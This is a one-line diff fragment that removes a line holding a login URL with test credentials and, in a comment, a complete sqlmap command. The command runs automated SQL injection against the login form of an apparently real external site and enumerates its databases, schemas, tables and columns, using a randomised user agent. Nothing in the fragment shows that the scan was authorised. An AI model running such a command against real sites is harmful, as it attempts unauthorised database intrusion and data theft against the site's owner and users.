@@ -1,1 +1,0 @@
-https://www.drhead.org/login?email=fsAs&password=bNtZ (GET)  # C:\Users\Administrateur\DashTo\env\Scripts\sqlmap -u https://www.drhead.org/login --batch --level=1 --risk=1 --technique=BEUSTQ --forms --schema --tables --columns --dbs --random-agent --output-dir=sqlmap_output_1741814702416
